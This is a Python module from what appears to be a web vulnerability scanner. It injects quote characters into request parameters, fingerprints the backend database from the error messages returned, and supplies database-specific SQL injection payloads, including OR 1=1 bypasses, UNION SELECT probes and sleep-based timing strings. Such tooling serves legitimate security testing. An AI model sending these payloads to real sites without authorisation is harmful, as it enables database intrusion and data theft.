"""SQLi Smart Probe — DB-aware error-based fingerprinting.

Sends quote probes, identifies DB type from error messages, then
returns a payload set tuned to the detected DB.
"""

from __future__ import annotations

from utils.colors import log_info
from utils.request import ScanExceptions, smart_request

# DB-specific error patterns
_DB_ERRORS = {
    "mysql": [
        "you have an error in your sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "unknown column",
        "warning: mysql",
    ],
    "postgresql": [
        "pg_query",
        "pg_exec",
        "unterminated quoted string",
        "psql:",
        "postgresql",
    ],
    "mssql": [
        "unclosed quotation mark",
        "microsoft sql",
        "odbc sql server",
        "mssql_query",
        "sqlsrv",
    ],
    "sqlite": [
        "sqlite3",
        "sqlite_",
        "unrecognized token",
        "sqlite.operationalerror",
    ],
    "oracle": [
        "ora-00",
        "oracle error",
        "quoted string not properly terminated",
    ],
}

# DB-specific comment syntax
_DB_COMMENTS = {
    "mysql": ["#", "-- -", "/**/"],
    "postgresql": ["--", "/**/"],
    "mssql": ["--", "/**/"],
    "sqlite": ["--", "/**/"],
    "oracle": ["--", "/**/"],
}

# DB-specific payloads
_DB_SQLI_PAYLOADS = {
    "mysql": [
        "' OR 1=1#",
        "' OR 1=1-- -",
        "' UNION SELECT NULL,NULL,NULL#",
        "1' ORDER BY 1#",
        "' AND SLEEP(3)#",
        "' AND 1=1#",
        "' AND 1=2#",
        "admin'#",
        "' OR ''='",
    ],
    "postgresql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=1--",
    ],
    "mssql": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' AND 1=1--",
    ],
    "sqlite": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--",
    ],
    "oracle": [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL FROM dual--",
        "' AND 1=1--",
    ],
    "generic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "') OR 1=1--",
        '" OR 1=1--',
        "' OR ''='",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "admin'--",
    ],
}


def probe_sqli_context(url, param, params, method="get", form_data=None, delay=0):
    """SQLi smart probe: detect DB type from quote-injection errors and emit DB-tuned payloads."""
    from urllib.parse import urlencode, urlparse, urlunparse

    result = {
        "db_type": None,
        "quote_type": None,
        "error_based": False,
        "smart_payloads": [],
    }

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    try:
        baseline = _send("1")
        baseline_text = baseline.text.lower()

        resp_sq = _send("1'")
        sq_text = resp_sq.text.lower()

        resp_dq = _send('1"')
        dq_text = resp_dq.text.lower()

        # Detect DB type from error
        db_detected = None
        error_text = ""

        for probe_text in [sq_text, dq_text]:
            for db, errors in _DB_ERRORS.items():
                for err in errors:
                    if err in probe_text and err not in baseline_text:
                        db_detected = db
                        error_text = err
                        break
                if db_detected:
                    break
            if db_detected:
                break

        # Detect which quote triggers error
        all_err_patterns = [e for errs in _DB_ERRORS.values() for e in errs]

        def _has_sql_error(text):
            return any(e in text for e in all_err_patterns)

        sq_error = (
            sq_text != baseline_text
            and len(sq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(sq_text))
        )
        dq_error = (
            dq_text != baseline_text
            and len(dq_text) != len(baseline_text)
            and (db_detected is not None or _has_sql_error(dq_text))
        )

        quote = None
        if sq_error and not dq_error:
            quote = "'"
        elif dq_error and not sq_error:
            quote = '"'
        elif sq_error:
            quote = "'"

        result["db_type"] = db_detected
        result["quote_type"] = quote
        result["error_based"] = db_detected is not None

        # Generate payloads
        payloads = []
        if db_detected:
            payloads.extend(_DB_SQLI_PAYLOADS.get(db_detected, []))
            log_info(
                f"  🧠 SQLi Probe [{param}]: "
                f"DB={db_detected} | Quote={quote} | "
                f"Error='{error_text}' | "
                f"{len(payloads)} targeted payloads"
            )
        else:
            payloads.extend(_DB_SQLI_PAYLOADS["generic"])
            if quote:
                log_info(
                    f"  🧠 SQLi Probe [{param}]: "
                    f"DB=unknown | Quote={quote} | "
                    f"{len(payloads)} generic payloads"
                )

        result["smart_payloads"] = payloads

    except ScanExceptions:
        pass

    return result
